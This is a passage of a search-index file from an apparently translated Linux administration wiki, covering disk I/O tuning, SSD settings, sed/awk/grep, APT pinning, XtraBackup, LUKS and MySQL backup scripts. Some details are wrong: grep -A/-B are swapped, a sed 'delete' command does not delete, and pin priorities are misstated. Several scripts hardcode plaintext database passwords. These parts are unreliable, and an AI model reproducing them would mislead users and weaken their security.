greatly improved info The algorithm is designed to stop itself if it detects too many random accesses so as not to impair performance. So don’t be afraid to test this feature. The read-ahead algorithm is managed by 2 values:\nThe current window: it controls the amount of data that the kernel will have to process when it makes I/O accesses. The ahead window When an application requests page access for reading in the buffer cache (which are part of the current window), the I/Os are done on the ahead window! However, when the application has finished reading on the current window, the ahead window becomes the new current window and a new ahead is created. If access to a page is in the current window, the size of the new ahead window will then be increased by 2 pages. If the read-ahead throughput is low, the ahead window size will be gradually reduced.\nTo know the size of read-aheads in sectors (1 sector = 512 Bytes):\n\u003e blockdev --getra /dev/sda 256 Or in kilobyte:\n\u003e cat /sys/block/sda/queue/read_ahead_kb 128 If you want to benchmark to see the best performance you can achieve with your disks:\n\u003e DEV=\"sda\" ; for V in 4 8 16 32 64 128 256 512 1024 2048 4096 8192; do echo $V; echo $V \u003e /sys/block/$DEV/queue/read_ahead_kb \u0026\u0026 hdparm -t /dev/$DEV | grep \"Timing\"; done 4 Timing buffered disk reads: 120 MB in 3.03 seconds = 39.58 MB/sec 8 Timing buffered disk reads: 194 MB in 3.02 seconds = 64.15 MB/sec 16 Timing buffered disk reads: 268 MB in 3.02 seconds = 88.73 MB/sec 32 Timing buffered disk reads: 268 MB in 3.00 seconds = 89.25 MB/sec 64 Timing buffered disk reads: 272 MB in 3.01 seconds = 90.38 MB/sec 128 Timing buffered disk reads: 272 MB in 3.01 seconds = 90.46 MB/sec 256 Timing buffered disk reads: 272 MB in 3.01 seconds = 90.24 MB/sec 512 Timing buffered disk reads: 272 MB in 3.02 seconds = 90.18 MB/sec 1024 Timing buffered disk reads: 270 MB in 3.00 seconds = 89.93 MB/sec 2048 Timing buffered disk reads: 272 MB in 3.00 seconds = 90.58 MB/sec 4096 Timing buffered disk reads: 272 MB in 3.01 seconds = 90.33 MB/sec 8192 Timing buffered disk reads: 270 MB in 3.00 seconds = 89.99 MB/sec However, you should take this information with a pinch of salt because you would need to test it with the application you want to run on this disk to get a truly satisfactory result. So override the value in /sys to change it. Insert it in /etc/rc.local to make it persistent.\ninfo The initial read-ahead window is equal to half of the configured one. The configured one corresponds to the maximum size of the read-ahead window! You can get a report like this:\n\u003e blockdev --report /dev/sda RO RA SSZ BSZ StartSec Size Device rw 256 512 1024 0 250000000000 /dev/sda Schedulers linkWhen the kernel receives multiple I/O requests simultaneously, it must manage them to avoid conflicts. The best solution (from a performance perspective) for disk access is sequential data addressed in logical blocks. In addition, I/O requests are prioritized based on their size. The smaller they are, the higher they are placed in the queue, since the disk will be able to deliver this type of data much more quickly than for large ones.\nTo avoid bottlenecks, the kernel ensures that all processes get I/Os. It’s the scheduler’s role to ensure that I/Os at the bottom of the queue are processed and not always postponed. When adding an entry to the queue, the kernel first tries to expand the current queue and insert the new request into it. If this is not possible, the new request will be assigned to another queue that uses an “elevator” algorithm.\nTo determine which I/O scheduler (elevator algorithm) is in use:\n\u003e grep CONFIG_DEFAULT_IOSCHED /boot/config-`uname -r` CONFIG_DEFAULT_IOSCHED=\"cfq\" Here are the schedulers you may find:\ndeadline: less efficiency, but less response time anticipatory: longer wait times, but better efficiency noop: the simplest, designed to save CPU cfq: tries to be as homogeneous as possible in all aspects For more official information: http://www.kernel.org/doc/Documentation/block/\nTo find out the scheduler currently being used:\n\u003e cat /sys/block/sda/queue/scheduler noop deadline [cfq] So it’s the algorithm in brackets that’s being used. To change the scheduler:\n\u003e echo noop \u003e /sys/block/sda/queue/scheduler [noop] deadline cfq Don’t forget to put this line in /etc/rc.local if you want it to persist.\nwarning Don’t do the following on a production machine or you risk having severe slowdowns for a few seconds To write all data in the cache to disk, clear the caches, and ensure the use of the newly chosen algorithm:\nsync sysctl -w vm.drop_caches=3 cfq linkThis is the default scheduler on Linux, which stands for: Completely Fair Queuing. This scheduler maintains 64 request queues, the IOs are addressed via the Round Robin algorithm to these queues. The addressed requests are used to minimize the movements of the read heads and thus gain speed.\nPossible options are:\nquantum: the total number of requests placed on the dispatch queue per cycle queued: the maximum number of requests allowed per queue To tune the CFQ elevator a bit, we need this package installed to have the ionice command:\naptitude install util-linux ionice allows you to change the read/write priority on a process. Here’s an example:\nionice -p1000 -c2 -n7 -p1: activates the request on PID 1000 -c2: allows specifying the desired class: 0: none 1: real-time 2: best-effort 3: idle -n7: allows specifying the priority on the chosen command/pid between 0 (most important) and 7 (least important) deadline linkEach scheduler request is assigned an expiration date. When this time has passed, the scheduler moves this request to the disk. To avoid too much solicitation for movements, the deadline scheduler will also handle other requests to a new location on the disk.\nIt’s possible to tune certain parameters such as:\nread_expire: number of milliseconds before each I/O read request expires write_expire: number of milliseconds before each I/O write request expires fifo_batch: the number of requests to move from the scheduler list to the ‘block device’ queue writes_starved: allows setting the preference on how many times the scheduler must do reads before doing writes. Once the number of reads is reached, the data will be moved to the ‘block device’ queue and writes will be processed. front_merge: a merger (addition) of requests at the bottom of the queue is the normal way requests are processed to be inserted into the queue. After a writes_starved, requests attempt to be added to the beginning of the queue. To disable this feature, set it to 0. Here are some examples of optimizations I found for DRBD which uses the deadline scheduler:\nDisable front merges: echo 0 \u003e /sys/block//queue/iosched/front_merges Reduce read I/O deadline to 150 milliseconds (the default is 500ms): echo 150 \u003e /sys/block//queue/iosched/read_expire Reduce write I/O deadline to 1500 milliseconds (the default is 3000ms): echo 1500 \u003e /sys/block//queue/iosched/write_expire anticipatory linkIn many situations, an application that reads blocks, waits, and resumes will read the blocks that follow the blocks just read. But if the desired data is not in the blocks following the last read, there will be additional latency. To avoid this kind of inconvenience, the anticipatory scheduler will respond to this need by trying to find the blocks that will be requested and put them in cache. The performance gain can then be greatly improved.\nRead and write access requests are processed in batches. Each batch corresponds in fact to a grouped response time.\nHere are the options:\nread_expire: number of milliseconds before each I/O read request expires write_expire: number of milliseconds before each I/O write request expires antic_expire: how long to wait for another request before reading the next one noop linkThe noop option allows for not using an intelligent algorithm. It serves requests as they come in. It’s notably used for host machines in virtualization. Or disks that incorporate TCQ technology to prevent two algorithms from overlapping and causing performance loss instead of gain.\nOptimizations for SSDs linkYou now understand the importance of options and the differences between disks as explained above. For SSDs, there’s some tuning to do if you want to have the best performance while optimizing their lifespan.\nAlignment linkOne of the first things to do is to create properly aligned partitions. Here’s an example of creating aligned partitions:\ndatas_device=/dev/sdb parted -s -a optimal $datas_device mklabel gpt parted -s -a optimal $datas_device mkpart primary ext4 0% 100% parted -s $datas_device set 1 lvm on line 1: we create a gpt type label for large partitions (greater than 2Tb) line 2: we create a partition that takes the entire disk line 3: we indicate that this partition will be of LVM type TRIM linkThe TRIM function is disabled by default. You’ll also need a kernel at least equal to 2.6.33. In order to use TRIM, you’ll need to use one of the filesystems designed for SSDs that support this technology:\nBtrfs Ext4 XFS JFS In your fstab, you’ll then need to add the ‘discard’ option to enable TRIM:\n# /etc/fstab: static file system information. # # Use 'blkid' to print the universally unique identifier for a # device; this may be used with UUID= as a more robust way to name devices # that works even if disks are added and removed. See fstab(5). # # /dev/mapper/vg-root / ext4 noatime,nodiratime,discard,errors=remount-ro 0 1 # /boot was on /dev/sda2 during installation UUID=f41d22fd-a348-42aa-b1a3-4997d19555c8 /boot ext2 defaults,noatime,nodiratime 0 2 # /boot/efi was on /dev/sda1 during installation UUID=3104-A1D4 /boot/efi vfat defaults 0 1 /dev/mapper/vg-home /home ext4 noatime,nodiratime,discard 0 2 /dev/mapper/vg-swap none swap sw 0 0 On LVM linkIt’s also possible to enable TRIM on LVM (/etc/lvm/lvm.conf):\n[...] # Issue discards to a logical volumes's underlying physical volume(s) when # the logical volume is no longer using the physical volumes' space (e.g. # lvremove, lvreduce, etc). Discards inform the storage that a region is # no longer in use. Storage that supports discards advertise the protocol # specific way discards should be issued by the kernel (TRIM, UNMAP, or # WRITE SAME with UNMAP bit set). Not all storage will support or benefit # from discards but SSDs and thinly provisioned LUNs generally do. If set # to 1, discards will only be issued if both the storage and kernel provide # support. # 1 enables; 0 disables. issue_discards = 1 [...] noatime linkIt’s possible to disable access times on files. By default, each time you access a file, the access date is recorded on it. If there are many concurrent accesses on a partition, it ends up being felt enormously. That’s why you can disable it if this feature is not useful to you. In your fstab, add the noatime option:\n/dev/mapper/vg-home /home ext4 defaults,noatime 0 2 It’s also possible to use the same functionality for folders:\n/dev/mapper/vg-home /home ext4 defaults,noatime,nodiratime 0 2 Scheduler linkSimply use deadline. CFQ is not optimal (although it has been revised for SSDs), we don’t want to work unnecessarily. Add the elevator option:\n# If you change this file, run 'update-grub' afterwards to update # /boot/grub/grub.cfg. # For full documentation of the options in this file, see: # info -f grub -n 'Simple configuration' GRUB_DEFAULT=0 GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=`lsb_release -i -s 2\u003e /dev/null || echo Debian` GRUB_CMDLINE_LINUX_DEFAULT=\"quiet elevator=deadline\" GRUB_CMDLINE_LINUX=\"\" # Uncomment to enable BadRAM filtering, modify to suit your needs # This works with Linux (no patch required) and with any kernel that obtains # the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...) #GRUB_BADRAM=\"0x01234567,0xfefefefe,0x89abcdef,0xefefefef\" # Uncomment to disable graphical terminal (grub-pc only) #GRUB_TERMINAL=console # The resolution used on graphical terminal # note that you can use only modes which your graphic card supports via VBE # you can see them in real GRUB with the command `vbeinfo' #GRUB_GFXMODE=640x480 # Uncomment if you don't want GRUB to pass \"root=UUID=xxx\" parameter to Linux #GRUB_DISABLE_LINUX_UUID=true # Uncomment to disable generation of recovery mode menu entries #GRUB_DISABLE_RECOVERY=\"true\" # Uncomment to get a beep at grub start #GRUB_INIT_TUNE=\"480 440 1\" SSD Detection linkIt’s possible thanks to UDEV to automatically define the scheduler to use depending on the type of disk (platter or SSD):\n# set deadline scheduler for non-rotating disks ACTION==\"add|change\", KERNEL==\"sd[a-z]\", ATTR{queue/rotational}==\"0\", ATTR{queue/scheduler}=\"deadline\" # set cfq scheduler for rotating disks ACTION==\"add|change\", KERNEL==\"sd[a-z]\", ATTR{queue/rotational}==\"1\", ATTR{queue/scheduler}=\"cfq\" Limiting writes linkWe’ll also limit the use of disk writes by putting tmpfs where temporary files are often written. Insert this into your fstab:\n[...] tmpfs\t/tmp\ttmpfs\tdefaults,noatime,mode=1777\t0\t0 tmpfs\t/var/lock\ttmpfs\tdefaults,noatime,mode=1777\t0\t0 tmpfs\t/var/run\ttmpfs\tdefaults,noatime,mode=1777\t0\t0 References linkhttp://www.mjmwired.net/kernel/Documentation/block/queue-sysfs.txt http://www.ocztechnologyforum.com/forum/showthread.php?85495-Tuning-under-linux-read_ahead_kb-wont-hold-its-value http://static.usenix.org/event/usenix07/tech/full_papers/riska/riska_html/main.html\n"
            }
        );
    index.add(
            {
                id:  198 ,
                href: "\/Sed_%5C\u0026_Awk_:_Quelques_exemples_de_ces_merveilles\/",
                title: "Sed \u0026 Awk: Some Examples of These Wonders",
                description: "Examples and usage patterns for Sed, Awk, and Grep commands in Linux for text manipulation, filtering, and processing.",
                content: "Introduction linkSed \u0026 Awk, but what are they? These are two binaries for content filtering. For example, if you have a file and you want to output only specific lines, or even replace things in a file. Of course, what I’m telling you isn’t extraordinary, but combined with regex, it becomes very powerful.\nSed linkDisplay certain lines of a large file:\nsed -n \"$LINE1,${LINE2}p;${LINEA2}q;\" \"$FILE\" Replace all occurrences of the word “stain” with the word “whiteness” in the file my_laundry, redirecting everything to the file my_clean_laundry:\nsed s/tache/blancheur/g mon_linge \u003e mon_linge_propre Replace all line beginnings with a “.” in the file my_laundry, redirecting everything to my_well_arranged_laundry:\nsed s/^/./ \u003e mon_linge_bien_range Replace all line endings with a “.” in the file my_laundry, redirecting everything to my_well_arranged_laundry:\nsed s/$/./ \u003e mon_linge_bien_range Delete all lines containing the word “stain”, redirecting everything to the file my_clean_laundry:\nsed s/.*tache.*/\\\\0/ \u003e mon_linge_propre To delete lines matching a pattern (here we delete empty lines):\nsed '/^$/d' monfichier Delete all lines containing the word “stain” and replace all line endings with a “.”, redirecting to my_good_smelling_laundry:\nsed -e 's/$/./' -e 's/.*tache.*/\\\\0/' \u003e mon_linge_qui_sent_bon To make modifications directly without going through another file (on the fly):\nsed -i 's/sysconfig/defaults/' cgconfig For purists, we can also do a substitution in perl:\nperl -pe 's/toto/tata/g' \u003c monfichier Replace the content of a file on the fly:\nperl -pi -e \"s/HOSTNAME=.*/HOSTNAME=node3.deimos.fr/\" /etc/sysconfig/network Or even with the replace command (which replaces in all *.ini of the current folder):\nreplace -v from to from to \"persistence=FILE\" \"persistence=BRIDGEPERSISTENCE\" -- *.ini or also:\nfind . -name \"*.c\" -exec sed -i \"s/oldWord/newWord/g\" '{}' \\; Delete the 10th line of a file:\nsed -i '10d' Delete x lines from a line number:\nsed '1,55d' fichier.old \u003e fichier.new This will delete lines 1 to 55\nAwk linkDisplay the 2nd column (PID) of the result of a ps aux:\nps aux|awk '{print $2}' Display the 2nd column (PID) of the result of a ps aux, preceded by a label:\nps aux|awk '{printf(\"PID: %s\\n\"), $2}' Display the 2nd column (PID) of the result of a ps aux, preceded by a label and showing the user:\nps aux|awk '{printf(\"PID: %s used by %s\\n\"), $2, $1}' Display /etc/passwd well arranged:\nawk -F: '{printf(\"User: %s\\nUID: %s\\nGID: %s\\nName: %s\\nHome: %s\\nShell: %s\\n\", $1, $3, $4, $5, $6, $7)}' /etc/passwd Use mathematical functions:\necho \"3 4\" | awk '{print int($1+$2)}' (normally displays 7, if all goes well) It is possible to have the equivalent of a grep and an awk in the same awk:\nip a | awk '/inet/{print $2}' This allows me to get all IPs present on my machine.\nFor more examples: AWK - the reference scripting language for file processing\nGrep linkGrep was not planned for the program, but here it is, I’ll add it anyway :-)\nTo display only the root line in /etc/passwd:\ngrep ^root \u003c /etc/passwd or\ncat /etc/passwd | grep ^root But this last line calls another instruction (cat), which is not necessary.\nTo display all lines except those containing root:\ngrep -v root \u003c /etc/passwd Combine greps:\ncat /etc/passwd | grep -e toto -e tata -e titi It’s possible to see the lines before or after the grep result. To see 2 lines before:\ngrep -A2 string filename To see 2 lines after:\ngrep -B2 string filename To see 2 lines before and after:\ngrep -C2 string filename FAQ linkBinary database matches linkIf you encounter this error during a grep, your file may be too large, so grep considers it binary. But if this is not the case, you can force it to read anyway:\ngrep -a monfichier The -a bypasses the restriction\nResources linkTutorial for Sed\nAwk cheat sheet\n"
            }
        );
    index.add(
            {
                id:  199 ,
                href: "\/apt-ajouter-des-preferences-de-release-sur-certains-packages\/",
                title: "APT: Adding Release Preferences for Specific Packages",
                description: "How to configure APT to use packages from different Debian versions by setting package release preferences.",
                content: " Operating System Debian 6 Last Update 29/12/2013 Introduction linkYou may have encountered a situation where you’re running the stable version of your system, but you’d like to use a more up-to-date package from testing, for example. This is possible! :-)\nConfiguration linksource.list linkI’ve chosen backuppc as an example. Let’s say I’m using the stable version, and I’d like to permanently install the testing version. I need to edit my /etc/apt/source.list file so it contains what’s necessary to download from both stable and testing repositories:\n# Stable deb http://ftp.fr.debian.org/debian/ stable main non-free contrib deb-src http://ftp.fr.debian.org/debian/ stable main non-free contrib # Testing deb http://ftp.fr.debian.org/debian/ testing main non-free contrib deb-src http://ftp.fr.debian.org/debian/ testing main non-free contrib deb http://security.debian.org/ stable/updates main contrib non-free deb-src http://security.debian.org/ stable/updates main contrib non-free Then we update:\napt-get update Preferences linkNow, we’ll create a /etc/apt/preferences file and fill it as follows:\nPackage: * Pin: release a=stable Pin-priority: 900 Package: * Pin: release a=testing Pin-priority: 100 Let me try to be clear:\nPin: ‘Package *’ with Pin must be present to indicate each Debian version you want to use (here stable and testing) Pin-priority: priorities for Debian versions range from 1 to 1000. The highest value takes precedence over others. So here stable (900) is stronger than testing (500). That was for the essential part. Now to add backuppc, we’ll add these lines:\nPackage: backuppc Pin: release a=testing Pin-priority: 1001 Again, a brief explanation:\nPackage: we indicate the name of the package to update in a certain version Pin: I’m indicating that I want to switch to testing for the desired package Pin-priority: this must be a number above 1000 to override previous restrictions. And now to verify, if I do:\napt-get install backuppc I’m offered the testing version, without being offered the rest of the system in testing :-). Here’s some useful information:\nPin Priority Effect on the package 1001 Install the package even if it’s a downgrade 990 Default for target version archive 500 Default for normal archive 100 Default for non-automatic archive but with automatic upgrades 100 Used for installed package 1 Default for non-automatic archive -1 Never install the package even if recommended Installing a specific package without using the preferences file linkIt’s possible to install a specific package without explicitly configuring it. For example, for Nginx, here’s how to get the list of available packages:\napt-cache policy nginx nginx: Installé : (aucun) Candidat : 1.2.1-2.2+wheezy2 Table de version : 1.4.4-2 0 100 http://ftp.fr.debian.org/debian/ unstable/main amd64 Packages 1.2.1-2.2+wheezy2 0 500 http://ftp.fr.debian.org/debian/ wheezy/main amd64 Packages I can see the unstable and wheezy versions. If I want to install the unstable version, I’ll use the ‘-t’ option:\naptitude install -t unstable nginx Blocking updates for a specific package linkI never clearly remember how to block a Debian package update. Yet it’s quite simple if you follow the documentation!\nI continue to use and appreciate swiftfox but I have an issue with the latest version (2.0.0.9-1) which doesn’t work (problem loading libXcomposite.so.1). I don’t have the patience to search for a solution, so I decided to stay with the previous version I have installed: 2.0.0.6-1. For this, it’s very simple, just add the following lines to /etc/apt/preferences:\nPackage: swiftfox-athlon64 Pin: version 2.0.0.6-1 Pin-priority: 1001 The priority 1001 means that the package will never be updated, which is exactly what I want! We can verify this has been taken into account in two ways:\nBy trying to update (apt-get upgrade). We shouldn’t see the swiftfox package. By using apt-cache policy swiftfox-athlon64 Here’s the output of this last command:\n\u003e apt-cache policy swiftfox-athlon64 swiftfox-athlon64: Installé : 2.0.0.6-1 Candidat : 2.0.0.6-1 Étiquette de paquet : 2.0.0.6-1 Table de version : 2.0.0.9-1 1001 500 http://getswiftfox.com unstable/non-free Packages *** 2.0.0.6-1 1001 100 /var/lib/dpkg/status FAQ linkAPT: apt-get error: “E: Dynamic MMap ran out of room” linkThis message may appear during an “apt-get update” when apt no longer has enough space for its cache. To fix this problem, simply create a file /etc/apt/apt.conf and add the following line:\nAPT::Cache-Limit \"10000000\" Run a quick:\napt-get update And you’re done!\nResources linkhttps://www.debian.org/doc/manuals/debian-reference/ch02.en.html\n"
            }
        );
    index.add(
            {
                id:  200 ,
                href: "\/Xtrabackup_:_Optimiser_ses_backups_MySQL\/",
                title: "XtraBackup: Optimizing Your MySQL Backups",
                description: "A guide on how to optimize MySQL backups using Percona XtraBackup, including installation, full backups, incremental backups, and restoration procedures.",
                content: " Software version 2.1.2-611.wheezy Operating System Debian 7 Website XtraBackup Website Last Update 27/12/2013 Introduction linkXtraBackup is an open-source solution for optimizing your MySQL backups. It’s much faster than mysqldump since it works directly with files rather than SQL queries.\nIn this article, we’ll see how to use it. It’s important to know that XtraBackup is particularly effective with the InnoDB engine.\nInstallation linkInstalling it on Debian is very simple. First, we’ll add the repository:\napt-key adv --keyserver keys.gnupg.net --recv-keys 1C4CBDCDCD2EFD2A Create this file to add the repository:\n# /etc/apt/sources.list.d/percona.list deb http://repo.percona.com/apt VERSION main deb-src http://repo.percona.com/apt VERSION main Update and install:\naptitude update aptitude install xtrabackup Usage linkIt can be useful to store the credentials in a file if you want to back up locally:\n# /etc/mysql/conf.d/xtrabackup.cnf [xtrabackup] user= password= You can also use a file like ~/.my.cnf.\nBackup (full) linkTo make a full backup:\ninnobackupex --user=xxxxx --password=xxxx --databases=database_name directory_to_store_backup The backup will be stored in a folder named after its creation timestamp (example: 2011-09-19_09-32-19).\nIt’s possible to add the ‘–apply-log’ option, which will save more information to allow a simple restore by copying the folder to /var/lib/mysql:\ninnobackupex --apply-log --user=xxxxx --password=xxxx --databases=database_name directory_to_store_backup info With the –apply-log option, it’s impossible to make incremental backups with XtraBackup Backup (incremental) linkA full backup is required to be able to make an incremental backup. Once you have one, use this command to generate an incremental backup:\ninnobackupex --incremental directory_to_store_backup --incremental-basedir=directory_containing_the_full --user=root --password=xxxxx Restoration linkFrom a Full backup linkTo restore from a full backup, the operation is done in three parts:\nUse the apply-log argument: innobackupex --apply-log directory_of_the_full_backup Move the existing database to avoid any unwanted residue: mv /var/lib/mysql/database_directory{,.old} Run this command to restore (copy-back argument): innobackupex --ibbackup=xtrabackup --copy-back directory_of_the_full_backup From an incremental backup linkTo perform a restoration from an incremental backup, you again need several steps:\nPrepare the full backup. Here, use-memory is optional; it just speeds up the process: innobackupex --apply-log --redo-only directory_of_the_full_backup [--use-memory=1G] --user=root --password=xxxxx Apply the incremental backups, in order: innobackupex --apply-log directory_of_the_full_backup --incremental-dir=directory_of_the_incremental_backup [--use-memory=1G] --user=root --password=xxxxx Prepare the final backup: innobackupex-1.5.1 --apply-log directory_of_the_full_backup [--use-memory=1G] --user=root --password=xxxxx Restore the final backup: mv /var/lib/mysql/database_directory{,.old} innobackupex --ibbackup=xtrabackup --copy-back directory_of_the_full_backup Backup and restore from the slave linkHere is a solution when you do not have enough space on the local master to store backups. Simply use Netcat to grab the backup directly from the slave:\nmkdir /tmp/backups/ nc -l -p 8080 | tar xfi - -C /tmp/backups/ On the master:\ninnobackupex --stream=tar /tmp/ --slave-info | nc sql-slave 8080 Apply the logs on the slave:\ninnobackupex --apply-log --ibbackup=xtrabackup /tmp/backups/ "
            }
        );
    index.add(
            {
                id:  201 ,
                href: "\/Luks_:_Chiffrer_ses_partitions\/",
                title: "LUKS: Encrypting Your Partitions",
                description: "Learn how to use LUKS to encrypt partitions on Linux, including creating encrypted partitions, unlocking them, and managing passphrases.",
                content: "Introduction linkLUKS is one of the best disk encryption tools for Linux. We’ll see here how to use it.\nUsage linkCreating an Encrypted Partition linkBe aware that if you use an existing partition, all its data will be erased when initializing the encrypted partition. To initialize it (sdb1 for example):\n$ cryptsetup luksFormat /dev/sdb1 WARNING! ======== This will overwrite data on /dev/sdb1 irrevocably. Are you sure? (Type uppercase yes): YES Enter LUKS passphrase: Verify passphrase: Enter the password you want to use to decrypt the partition.\nUnlocking linkNext, we’ll unlock the encrypted partition to use it:\ncryptsetup luksOpen /dev/sdb1 secret Enter passphrase for /dev/sdb1: ‘secret’ corresponds here to the device mapper name. We can then verify its existence:\n$ ls /dev/mapper/ control secret Preparing the Partition linkNow we just need to format this partition:\nmkfs.ext4 /dev/mapper/secret And mount it in a directory.\nUnmounting the Encrypted Disk linkOnce you’ve finished, you need to properly close the disk by unmounting and locking it:\numount /dev/mapper/secret cryptsetup luksClose secret Mounting the Encrypted Partition Permanently linkIf you want to mount the partition permanently, you’ll need to use fstab and crypttab. In crypttab:\nsecret /dev/sdb1 /root/password luks secret: name of the device mapper /dev/sdb1: the physical device /root/password: the file containing your password (you can alternatively put the password directly in the crypttab file) If you chose to use a file containing the key, create it like this:\ncryptsetup luksAddKey /dev/sdb1 /root/password chmod 600 /root/password Then add the following line to fstab:\n... /dev/mapper/secret /mnt ext4 defaults 1 2 ... Your encrypted partition will now mount automatically at startup (there’s less benefit, but it might interest some users).\nAdding a Passphrase linkTo add a passphrase (maximum of 8 total), here’s how to proceed. First locate your encrypted partition:\ncryptsetup luksDump /dev/sdb1 Once you’re sure it’s the right one, add an additional passphrase:\ncryptsetup luksAddKey /dev/sdb1 If you want to change a passphrase, you’ll need to delete the old one using the method mentioned below.\nRemoving a Passphrase linkIf you want to remove one of your passphrases:\ncryptsetup luksRemoveKey /dev/sdb1 "
            }
        );
    index.add(
            {
                id:  202 ,
                href: "\/Sauvegardes,_restaurations_et_transferts\/",
                title: "MySQL: Backups, Restorations and Transfers",
                description: "Guide to backup, restore, and transfer MySQL databases with different methods including mysqldump, mysqlhotcopy, and LVM snapshots.",
                content: " Backups linkmysqldump linkIn my opinion, this is THE best method. It’s provided as standard and works very well. However, be careful with large databases. If you have large databases, then look at XtraBackup.\nIts use with a shell is as follows (for small databases):\nmysqldump -uUSER -pPASSWORD -e --single-transaction --opt DATABASE \u003e backup-`date +%y%m%d`.sql To back up all databases at once:\nmysqldump -uUSER -pPASSWORD --all-databases \u003e backup-`date +%y%m%d`.sql There are also other options:\n–no-data: allows you to generate a file that contains all the instructions for creating your database tables (CREATE DATABASE, CREATE TABLE…), but not the data itself. –no-createdb and –no-create-info allow you to automatically comment out schema creation instructions. So you can insert data from a backup into a database with existing tables. –lock-tables: allows you to place a LOCK on an entire database. This gives consistency between tables, but not between databases. –lock-all-tables: allows you to place a LOCK on all tables. Be aware of the impacts of such a LOCK on a large non-transactional database like MyISAM. Putting all queries on hold during the backup could make visitors think that the site’s server has crashed. At the end of the dump, all pending queries will be executed (no losses, unless the queue length has been exceeded). -e: allows you to accumulate creation of elements of the same type (so will be faster on reimport) –single-transaction: allows you to run backups in a transaction. It therefore guarantees that InnoDB tables (transactional engine) will be in a consistent state between them. Tables that do not support transactions will also be backed up, but consistency will not be guaranteed (the BEGIN instruction is simply ignored for these tables). The advantage of this option is that it does not use a LOCK. In fact, they will be locked inside the transaction, without preventing other clients from making changes to the database. –master-data: allows you to have the master’s positions for replication directly in the dump. –opt: adds drop-tables if they exist. Quickly backup each database linkTo back up each database simply and quickly, here is a solution:\nfor I in `echo \"show databases;\" | mysql -uroot -p | grep -v Database`; do mysqldump -uroot -p -e --single-transaction --opt $I \u003e \"$I.sql\"; done You’ll need to hardcode the password (create a backup user with only backup rights for improved security).\nmysqlhotcopy linkThis command is a PERL script delivered with MySQL that essentially performs a raw file copy. However, this method is quite efficient.\nThis command allows you to do:\ncp: if it’s for a local backup scp: if it’s for remote It places lock files on the tables to be backed up. There is also the –record_log_pos option which allows you to record the position in the binary logs when the server is in master or slave mode (to quickly create a new slave). A few small examples for a local backup:\nmysqlhotcopy user password /var/lib/mysql/ma_base And for a remote backup:\nmysqlhotcopy --user=user --password=pass user user@host:/home/mon_backup A small disadvantage, but one that is important: mysqlhostcopy only works with MyISAM and ARCHIVE. There is a paid tool (HOT Backup) that allows you to do the same thing but with InnoDB as well.\nLVM Snapshot linkI won’t go into how to use LVM here, but it’s the method to use for large databases (16 GB for example).\nFirst, we need to place a lock (yes, we’re still obliged to, but it only lasts a few hundredths of a second):\nflush tables with read lock; Then we create our snapshot:\nlvcreate --snapshot -n snap -L 16G /dev/volumegroupe/snapshot_mysql Since the operation is instantaneous, we can remove the lock:\nmysql\u003e unlock tables; Restorations linkRestoration is done by directly using the main program:\nmysql -u -p \u003c backup-`date +%y%m%d`.sql If you want to restore only one database from a dump where there are all databases:\nmysql -u -p --one-database \u003c backup-`date +%y%m%d`.sql Transfers linkFinally, if the goal is to transfer the database from one machine to another, you can combine the two calls on a single line:\nmysqldump -uUSER -pPASSWORD DATABASE | ssh user:password@IP \"cat \u003e myfile.sql\" Scripts linkBackup by mail linkHere is a small script to adapt according to your needs:\n#!/bin/sh ## MySQL Backup Script ## Made by Pierre Mavro ## MYSQL INFO ## LOGIN=root # Login for mysql PASS=toto # Pass for mysql ## Email ## ADMINMAIL=xxx@mycompany.com # This is the mail where the saves will be sent ## Vars ## TMPDIR=/tmp/baksql # Temp directory ## DO NOT MODIFY NOW ## mkdir $TMPDIR # Backuping databases for databases in \"cacti\" \"information_schema\" \"mysql\" \"snort\" \"wikidb\" ; do mysqldump -u$LOGIN -p$PASS $databases \u003e $TMPDIR/$databases-`date +%y%m%d`.sql \u0026\u0026 baksql=$baksql`echo \"Backup of database $databases - OK ; \"` || baksql=$baksql`echo \"Backup of database $databases - FAILED ; \"` done # Compressing and emailing tar -czf $TMPDIR/mysql_backup.tgz $TMPDIR/*.sql \u0026\u0026 echo \"`echo $baksql`\" | mutt -x -a $TMPDIR/mysql_backup.tgz -s \"MySQL backup - `date +%d\\-%m\\-%Y` - fire\" $ADMINMAIL rm -Rf $TMPDIR Backup and compression of all databases linkThis more tedious method has the advantage of backing up database by database, which allows you to restore only the database you’re interested in if there’s a problem.\nAdditionally, it includes on-the-fly compression of your database. However, you’ll need to install 7zip beforehand (I chose 7zip for better compression).\nLet’s create a script that we’ll place in /etc/scripts for example:\n#!/bin/bash user='root' password='password' destination='/tmp/backups_sql' mail='xxx@mycompany.com' mkdir -p $destination for i in `echo \"show databases;\" | mysql -u$user -p$password | grep -v Database`; do mysqldump -u$user -p$password --opt --add-drop-table --routines --triggers --events --single-transaction --master-data=2 -B $i | 7z a -t7z -mx=9 -si $destination/$i.sql.7z done problem_text='' problem=0 for i in `ls $destination/*` ; do size=`du -sk $i | awk '{ print $1 }'` if [ $size -le 4 ] ; then problem_text=\"$problem_text- $i database. Backupped database size is equal or under 4k ($size)\\n\" problem=1 fi done if [ $problem -ne 0 ] ; then echo -e \"Backups problem detected on:\\n\\n$problem_text\" | mail -s \"$HOSTNAME - MySQL backup problem\" $mail fi The problem here is the clear text password. So make sure to properly restrict access to the user who will be backing up:\nchmod 700 /etc/scripts/backup_mysql_databases.sh Transfers of a MySQL database to another via SSH link #!/bin/sh ## MySQL Backup Script ## Made by Pierre Mavro ## MYSQL INFO ## LOGIN=root # Login for mysql PASS=toto # Pass for mysql ## SSH SERVER FOR TRANSFER \u0026 REINJECTION ## MYSQLSRV2=\"192.168.0.1\" ## Email ## ADMINMAIL=xxx@mycompany.com # This is the mail where transfer failures will be notified ## Vars ## TMPDIR=/tmp/baksql # Temp directory ## DO NOT MODIFY NOW ## mkdir $TMPDIR # Backuping databases for databases in \"bugzilla\" \"cacti\" \"mysql\" \"networkdb\" \"wiki\" ; do mysqldump -u$LOGIN -p$PASS $databases \u003e $TMPDIR/$databases-`date +%y%m%d`.sql \u0026\u0026 baksql=$baksql`echo \"Backup of database $databases - OK ; \"` || baksql=$baksql`echo \"Backup of database $databases - FAILED ; \"` done # Transfering databases to the other SQL server (need ssh key) tar -czf $TMPDIR/mysql_backup.tgz $TMPDIR/*.sql scp $TMPDIR/mysql_backup.tgz $MYSQLSRV2:~/ ssh $MYSQLSRV2 tar -xzvf ~/mysql_backup.tgz for databases in \"bugzilla\" \"cacti\" \"mysql\" \"networkdb\" \"wiki\" ; do ssh 